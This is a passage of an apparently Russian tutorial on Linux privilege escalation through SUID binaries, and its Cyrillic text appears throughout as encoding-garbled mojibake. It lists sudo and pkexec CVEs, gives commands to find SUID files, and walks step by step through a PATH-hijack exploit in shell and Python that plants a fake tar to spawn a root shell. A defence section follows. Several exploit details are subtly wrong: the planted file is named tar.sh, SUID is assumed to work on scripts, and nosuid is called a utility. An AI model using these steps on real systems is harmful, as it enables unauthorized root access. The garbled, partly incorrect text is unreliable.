> –ö–∞—Ç–∞–ª–æ–≥ –ª–µ–≥–∏—Ç–∏–º–Ω—ã—Ö –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π (–Ω–∞–ø—Ä–∏–º–µ—Ä, `find`, `nmap`, `vim`)  

---

#### [CVE-2023-22809] ‚Äî –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ `sudoedit` (sudo)
üîó https://www.qualys.com/2023/01/30/cve-2023-22809/cve-2023-22809.txt
> –£—è–∑–≤–∏–º–æ—Å—Ç—å –ø–æ–∑–≤–æ–ª—è–µ—Ç **–æ–±–æ–π—Ç–∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ `sudoedit`** –∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã –æ—Ç –∏–º–µ–Ω–∏ root —á–µ—Ä–µ–∑ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫—É —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∏—Ö —Å—Å—ã–ª–æ–∫, –∫–æ–≥–¥–∞ –∑–∞–¥–µ–π—Å—Ç–≤–æ–≤–∞–Ω `sudoedit`

–ö–æ–º–∞–Ω–¥–∞ `sudoedit` –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ (—á–µ—Ä–µ–∑ SUID), –Ω–æ –¥–æ–ª–∂–Ω–∞ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞—Ç—å, –∫–∞–∫–∏–µ —Ñ–∞–π–ª—ã –º–æ–∂–Ω–æ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å. –£—è–∑–≤–∏–º–æ—Å—Ç—å –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞—Ç–∞–∫—É—é—â–µ–º—É —Å–æ–∑–¥–∞—Ç—å **symbolic link** –Ω–∞ –∑–∞—â–∏—â—ë–Ω–Ω—ã–π —Ñ–∞–π–ª, –Ω–∞–ø—Ä–∏–º–µ—Ä, `/etc/passwd`, –∏ –∏–∑–º–µ–Ω–∏—Ç—å –µ–≥–æ **—á–µ—Ä–µ–∑ –ø–æ–¥—Å—Ç–∞–≤–Ω–æ–π —Ñ–∞–π–ª**, –∏—Å–ø–æ–ª—å–∑—É—è —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ –ø–æ–¥–æ–±—Ä–∞–Ω–Ω—ã–π `argv[]` –¥–ª—è –æ–±—Ö–æ–¥–∞ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏

---

#### [CVE-2021-4034] ‚Äî –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ `pkexec` (PwnKit)
üîó https://access.redhat.com/security/cve/CVE-2021-4034
> –£—è–∑–≤–∏–º–æ—Å—Ç—å –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–∑–≤–∞—Ç—å `pkexec` (—É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω —Å SUID) **–±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤**, —á—Ç–æ –≤—ã–∑—ã–≤–∞–µ—Ç –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç **–∏–Ω—ä–µ–∫—Ü–∏—é –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è**, –ø—Ä–∏–≤–æ–¥—è—â—É—é –∫ **–≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –∫–æ–¥–∞ –æ—Ç root**

---

#### [CVE-2019-18634] ‚Äî Stack overflow –≤ `sudo`
üîó https://www.sudo.ws/security/advisories/sudo_1.8.25p1.html
> –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥, –≤—ã–∑–≤–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ SUDO —Å –ø—Ä–∞–≤–∞–º–∏ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –≤ —Å–ª—É—á–∞–µ –≤–∫–ª—é—á—ë–Ω–Ω–æ–≥–æ `pwfeedback`, –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏—é —Å—Ç–µ–∫–∞ –∏ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–º—É **–≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞**

–¢—Ä–µ–±—É–µ—Ç—Å—è SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫ sudo —Å –≤–∫–ª—é—á—ë–Ω–Ω–æ–π –æ–ø—Ü–∏–µ–π `pwfeedback` –≤ `/etc/sudoers`.

---

## –ê–ª–≥–æ—Ä–∏—Ç–º –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

### 1. –ü–æ–∏—Å–∫ SUID/SGID-—Ñ–∞–π–ª–æ–≤
```bash
find / -perm -4000 -type f 2>/dev/null  # –ü–æ–∏—Å–∫ –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤ —Å SUID-–±–∏—Ç–æ–º
find / -perm -2000 -type f 2>/dev/null  # –ü–æ–∏—Å–∫ –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤ —Å SGID-–±–∏—Ç–æ–º
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
- `-4000` ‚Äî –º–∞—Å–∫–∞ SUID, 
- `-2000` ‚Äî –º–∞—Å–∫–∞ SGID  
- `2>/dev/null` ‚Äî –ø–æ–¥–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–∞—Ö (–Ω–∞–ø—Ä–∏–º–µ—Ä, "Permission denied")


```python
import os, stat

def find_suid_sgid(root='/'):
    """
    –ü—Ä–æ—Ö–æ–¥ –ø–æ —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ –∏ –≤—ã–≤–æ–¥ –ø—É—Ç–µ–π –∫ —Ñ–∞–π–ª–∞–º —Å SUID/SGID.
    """
    for dirpath, dirnames, filenames in os.walk(root):
        for fname in filenames:
            path = os.path.join(dirpath, fname)
            try:
                st = os.stat(path)
            except PermissionError:
                continue  # –Ω–µ—Ç –ø—Ä–∞–≤ –Ω–∞ —á—Ç–µ–Ω–∏–µ ‚Äî –ø—Ä–æ–ø—É—Å–∫–∞–µ–º
            mode = st.st_mode
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º SUID‚Äë–±–∏—Ç
            if mode & stat.S_ISUID:
                print(f"[SUID] {path}")
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º SGID‚Äë–±–∏—Ç
            if mode & stat.S_ISGID:
                print(f"[SGID] {path}")

if __name__ == "__main__":
    find_suid_sgid("/")  # –∑–∞–ø—É—Å–∫–∞–µ–º –ø–æ–∏—Å–∫ –æ—Ç –∫–æ—Ä–Ω—è
```

---

### 2. –ê–Ω–∞–ª–∏–∑ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤

#### –û—Ü–µ–Ω–∫–∞:
- –≠—Ç–æ **–Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –±–∏–Ω–∞—Ä–Ω–∏–∫**?
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –ª–∏ –æ–Ω **shell-–∫–æ–º–∞–Ω–¥—ã –±–µ–∑ —É–∫–∞–∑–∞–Ω–∏—è –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏**?
- –ó–∞–≥—Ä—É–∂–∞–µ—Ç –ª–∏ **–¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏** –±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏?
- –ü—Ä–∏–Ω–∏–º–∞–µ—Ç –ª–∏ **–≤–≤–æ–¥ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è** –±–µ–∑ –≤–∞–ª–∏–¥–∞—Ü–∏–∏?

#### –î–µ–π—Å—Ç–≤–∏—è:
1. **–ò–∑—É—á–∏—Ç—å –≤—ã–∑–æ–≤—ã –≤–Ω–µ—à–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º–º** (`system()`, `exec*()`):  
   - –ï—Å–ª–∏ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è `tar`, `cp`, `bash` –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏ ‚Üí —Ä–∏—Å–∫ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∏.  
2. **–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫—É –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤**:  
   - –ï—Å—Ç—å –ª–∏ –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ –ø–∞—Ä—Å–∏–Ω–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞?  
   - –í–æ–∑–º–æ–∂–Ω–∞ –ª–∏ –ø–µ—Ä–µ–¥–∞—á–∞ `../` (path traversal)?  
3. **–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è**:  
   - `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `IFS` –∏ —Ç.–ø.  

---

### 3. –í—ã–±–æ—Ä –º–µ—Ç–æ–¥–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏

–í –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –ª–æ–≥–∏–∫–∏ –±–∏–Ω–∞—Ä–Ω–∏–∫–∞ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:

- **–ü–æ–¥–º–µ–Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –æ–∫—Ä—É–∂–µ–Ω–∏—è `PATH`**  
  –ï—Å–ª–∏ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –≤–Ω–µ—à–Ω—è—è –∫–æ–º–∞–Ω–¥–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `tar`, `cp`, `ls`), –Ω–æ **–Ω–µ —É–∫–∞–∑–∞–Ω –∞–±—Å–æ–ª—é—Ç–Ω—ã–π –ø—É—Ç—å**


- **LD_PRELOAD –∞—Ç–∞–∫–∞**  
  –ï—Å–ª–∏ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫ **–Ω–µ –∑–∞—â–∏—â—ë–Ω** (–Ω–µ –∏–º–µ–µ—Ç `noexec` –∏ –∑–∞—â–∏—â—ë–Ω–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–∏), –º–æ–∂–Ω–æ –≤–Ω–µ–¥—Ä–∏—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—É—é `.so`-–±–∏–±–ª–∏–æ—Ç–µ–∫—É
  > –†–∞–±–æ—Ç–∞–µ—Ç **—Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –±–∏–Ω–∞—Ä–Ω–∏–∫ –ù–ï —è–≤–ª—è–µ—Ç—Å—è SUID root**, –ª–∏–±–æ –∑–∞–≥—Ä—É–∂–∞–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤—Ä—É—á–Ω—É—é


- **–£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ Python, Perl, Ruby –∏ –¥—Ä—É–≥–∏—Ö –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∏—Ä—É–µ–º—ã—Ö —Å–∫—Ä–∏–ø—Ç–∞—Ö**  
  –ï—Å–ª–∏ —Ñ–∞–π–ª —Å SUID –∑–∞–ø—É—Å–∫–∞–µ—Ç —Å–∫—Ä–∏–ø—Ç –±–µ–∑ –∑–∞—â–∏—Ç—ã (`#!/usr/bin/python`), –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∏–º–ø–æ—Ä—Ç—ã –∏–ª–∏ exec
  > SUID –Ω–∞–ø—Ä—è–º—É—é –Ω–∞ —Å–∫—Ä–∏–ø—Ç—ã –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –Ω–æ –º–æ–∂–µ—Ç –±—ã—Ç—å —É—è–∑–≤–∏–º—ã–π –±–∏–Ω–∞—Ä–Ω–∏–∫, –∑–∞–ø—É—Å–∫–∞—é—â–∏–π –∏—Ö

---

### 4. –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏

- –ß—Ç–µ–Ω–∏–µ –∑–∞—â–∏—â—ë–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤;
- –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π;
- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–π **shell** –æ—Ç **root**.

---

## –ü—Ä–∏–º–µ—Ä –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π —á–µ—Ä–µ–∑ —É—è–∑–≤–∏–º—ã–π SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫

–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–∞ –±–∏–Ω–∞—Ä–Ω–∏–∫–∞ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞.  
–ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, –Ω–∞–π–¥–µ–Ω —É—è–∑–≤–∏–º—ã–π SUID‚Äë—Å–∫—Ä–∏–ø—Ç `/usr/local/bin/mybackup`, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞ —Å–∞–º–æ–º –¥–µ–ª–µ —è–≤–ª—è–µ—Ç—Å—è Python‚Äë–æ–±—ë—Ä—Ç–∫–æ–π:

```python
#!/usr/bin/env python3
import os, subprocess

# –≠—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å –ø—Ä–∞–≤–∞–º–∏ root –∏–∑‚Äë–∑–∞ SUID‚Äë–±–∏—Ç–∞, –Ω–æ –æ—á–∏—â–∞–µ—Ç –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∏ –Ω–µ –∑–∞–¥–∞—ë—Ç –ø–æ–ª–Ω—ã–µ –ø—É—Ç–∏ (–≤–æ–∑–º–æ–∂–Ω–∞ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∞)
subprocess.call("tar -cf /tmp/backup.tar /home/user", shell=True)
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –ö–ª—é—á–µ–≤–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å –∑–¥–µ—Å—å ‚Äî –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–µ —É–∫–∞–∑–∞–Ω–∏—è –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏ –∫ –±–∏–Ω–∞—Ä–Ω–∏–∫—É tar. –≠—Ç–æ –∑–Ω–∞—á–∏—Ç, —á—Ç–æ –æ–±–æ–ª–æ—á–∫–∞ (`/bin/sh`) –±—É–¥–µ—Ç –∏—Å–∫–∞—Ç—å tar –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –æ–∫—Ä—É–∂–µ–Ω–∏—è PATH, –Ω–∞—á–∏–Ω–∞—è —Å –ø–µ—Ä–≤–æ–≥–æ –Ω–∞–π–¥–µ–Ω–Ω–æ–≥–æ.
- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Å–æ–∑–¥–∞—ë—Ç —Å–≤–æ—é "—Ñ–∞–ª—å—à–∏–≤—É—é" –≤–µ—Ä—Å–∏—é –∫–æ–º–∞–Ω–¥—ã tar, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–¥–º–µ–Ω—è–µ—Ç –Ω–∞—Å—Ç–æ—è—â—É—é.

---

### –ë–ª–æ–∫-—Å—Ö–µ–º–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏
```
[–ó–∞–ø—É—Å–∫ SUID-—Å–∫—Ä–∏–ø—Ç–∞ mybackup –æ—Ç root] 
  ‚Üí [–í–Ω—É—Ç—Ä–∏ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è 'tar -cf ...' –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏] 
  ‚Üí [–°–∏—Å—Ç–µ–º–∞ –∏—â–µ—Ç 'tar' –ø–æ PATH: –ø–µ—Ä–≤—ã–º –∏–¥—ë—Ç /tmp] 
  ‚Üí [–ù–∞—Ö–æ–¥–∏—Ç –∏ –∑–∞–ø—É—Å–∫–∞–µ—Ç –ø–æ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π /tmp/tar.sh] 
  ‚Üí [–í–Ω—É—Ç—Ä–∏ tar.sh –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è /bin/bash] 
  ‚Üí [bash –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ (–Ω–∞—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ –æ—Ç SUID)] 
  ‚Üí [–û—Ç–∫—Ä—ã–≤–∞–µ—Ç—Å—è root-–æ–±–æ–ª–æ—á–∫–∞ —Å –ø—Ä–∞–≤–∞–º–∏ —Å—É–ø–µ—Ä–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è]
```

---

### –®–∞–≥ 1: –°–æ–∑–¥–∞—ë–º –ø–æ–¥–¥–µ–ª—å–Ω—ã–π `tar`
```bash
cat << 'EOF' > /tmp/tar.sh
#!/bin/bash
/bin/bash
EOF
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- `cat << 'EOF' > /tmp/tar.sh` ‚Äî —Å–æ–∑–¥–∞—ë—Ç –Ω–æ–≤—ã–π —Ñ–∞–π–ª `/tmp/tar.sh` –∏ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç –≤ –Ω–µ–≥–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –º–µ–∂–¥—É `EOF`
- `#!/bin/bash` ‚Äî —à–µ–±–∞–Ω–≥: –≥–æ–≤–æ—Ä–∏—Ç –û–°, —á—Ç–æ —Å–∫—Ä–∏–ø—Ç –¥–æ–ª–∂–µ–Ω –∏—Å–ø–æ–ª–Ω—è—Ç—å—Å—è —Å –ø–æ–º–æ—â—å—é `bash`
- `/bin/bash` ‚Äî –∑–∞–ø—É—Å–∫–∞–µ—Ç –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—É—é –æ–±–æ–ª–æ—á–∫—É `bash`  
  ‚Üí –ü–æ—Å–∫–æ–ª—å–∫—É —ç—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω –æ—Ç **root** (–∏–∑-–∑–∞ SUID), –∑–∞–ø—É—â–µ–Ω–Ω—ã–π bash ‚Äî —ç—Ç–æ **root‚Äë–æ–±–æ–ª–æ—á–∫–∞**


### –®–∞–≥ 2: –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–ø—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º
```bash
chmod +x /tmp/tar.sh
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- `+x` ‚Äî –¥–æ–±–∞–≤–ª—è–µ—Ç –ø—Ä–∞–≤–∞ –Ω–∞ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π (–ø–æ—Å–∫–æ–ª—å–∫—É –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞ –æ–Ω —Å–æ–∑–¥–∞–µ—Ç—Å—è –±–µ–∑ –ø—Ä–∞–≤ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ)

### –®–∞–≥ 3: –ü–æ–¥–º–µ–Ω—è–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –æ–∫—Ä—É–∂–µ–Ω–∏—è PATH
```bash
export PATH="/tmp:$PATH"
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –ó–∞–¥–∞—ë—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é `PATH` —Ç–∞–∫, —á—Ç–æ–±—ã `/tmp` –±—ã–ª **–≤ –Ω–∞—á–∞–ª–µ —Å–ø–∏—Å–∫–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π**
- –î–∞–ª–µ–µ, –∫–æ–≥–¥–∞ –æ–±–æ–ª–æ—á–∫–∞ –±—É–¥–µ—Ç –∏—Å–∫–∞—Ç—å `tar`, –æ–Ω–∞ —Å–Ω–∞—á–∞–ª–∞ –ø–æ—Å–º–æ—Ç—Ä–∏—Ç –≤ `/tmp`, –∏ **–Ω–∞–π–¥—ë—Ç `tar.sh`**, –∞ –Ω–µ `/bin/tar`

### –®–∞–≥ 4: –ó–∞–ø—É—Å–∫–∞–µ–º —É—è–∑–≤–∏–º—ã–π –±–∏–Ω–∞—Ä–Ω–∏–∫
```bash
/usr/local/bin/mybackup
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –∏ –≤—ã–∑—ã–≤–∞–µ—Ç `tar` (–±–µ–∑ –ø—É—Ç–∏), –∑–Ω–∞—á–∏—Ç –æ–±–æ–ª–æ—á–∫–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç `/tmp/tar.sh`.
- –í–Ω—É—Ç—Ä–∏ `tar.sh` –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è `/bin/bash`, –∫–æ—Ç–æ—Ä—ã–π –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å **—ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º UID = 0**

### –®–∞–≥ 5: –ü–æ–ª—É—á–∞–µ–º root‚Äë—à–µ–ª–ª:
> –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –ø–æ–ª—É—á–∞–µ–º **–∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—É—é root-–æ–±–æ–ª–æ—á–∫—É** `bash`, —Ä–∞–±–æ—Ç–∞—é—â–∏–π —Å **—ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º UID = 0**, —Ç.–µ. **root**

```bash
whoami  # root
id  # uid=0(root) gid=0(root)
```

---

### Python‚Äë—Å–∫—Ä–∏–ø—Ç

```python
import os, subprocess

# –°–æ–∑–¥–∞—ë–º ¬´–∑–ª–æ–≤—Ä–µ–¥–Ω—ã–π¬ª tar –≤ /tmp
with open("/tmp/tar.sh", "w") as f:
    f.write("#!/bin/bash\n/bin/bash\n")
os.chmod("/tmp/tar.sh", 0o755)     # –¥–∞—ë–º –ø—Ä–∞–≤–∞ +x

# –ü–æ–¥–º–µ–Ω—è–µ–º PATH
os.environ["PATH"] = "/tmp:" + os.environ.get("PATH", "")

# –ó–∞–ø—É—Å–∫–∞–µ–º —É—è–∑–≤–∏–º—ã–π —Å–∫—Ä–∏–ø—Ç
subprocess.call(["/usr/local/bin/mybackup"])
# –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —É –Ω–∞—Å –ø–æ–ø–∞–¥–∞–µ—Ç –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π bash —Å root‚Äë–ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏
```

**–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:**  
- –£—è–∑–≤–∏–º—ã–π —Å–∫—Ä–∏–ø—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å **root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏** –∏–∑-–∑–∞ SUID
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è **–æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–π –ø—É—Ç—å** –∫ `tar` (–Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ!)
- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç —É–ø—Ä–∞–≤–ª—è—Ç—å `PATH`, –∞ –∑–Ω–∞—á–∏—Ç ‚Äî **–ø–æ–¥—Å—Ç–∞–≤–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –ø—Ä–æ–≥—Ä–∞–º–º—É –≤–º–µ—Å—Ç–æ —Å–∏—Å—Ç–µ–º–Ω–æ–π**

---

## –ó–∞—â–∏—Ç–∞ –æ—Ç –∞—Ç–∞–∫

### –ê–∫—Ç–∏–≤–Ω—ã–µ –º–µ—Ä—ã:
- –ú–∏–Ω–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å —á–∏—Å–ª–æ –Ω–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö SUID/SGID‚Äë—Ñ–∞–π–ª–æ–≤, —É–¥–∞–ª–µ–Ω–∏–µ –Ω–µ–Ω—É–∂–Ω—ã—Ö –∏–ª–∏ –∑–∞–º–µ–Ω–∞ –∏—Ö –Ω–∞ –∞–Ω–∞–ª–æ–≥–∏ –±–µ–∑ SUID/SGID
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —É—Ç–∏–ª–∏—Ç—É `nosuid` –ø—Ä–∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ç–æ–º–æ–≤
- –ö–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è (–æ–±–Ω—É–ª—è—Ç—å **LD_PRELOAD**, **PATH**, **IFS** –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º –≤–Ω–µ—à–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º–º –≤ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–∞—Ö)
- –ó–∞–¥–∞–≤–∞—Ç—å –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º —Ñ–∞–π–ª–∞–º –≤ SUID-–ø—Ä–æ–≥—Ä–∞–º–º–∞—Ö
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ Mandatory Access Control (MAC) **AppArmor / SELinux** –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—è –ø–æ–≤–µ–¥–µ–Ω–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –ø—Ä–∞–≤ –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤
- –ù–∏–∫–æ–≥–¥–∞ –Ω–µ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å SUID/SGID –Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ —Å–∫—Ä–∏–ø—Ç—ã
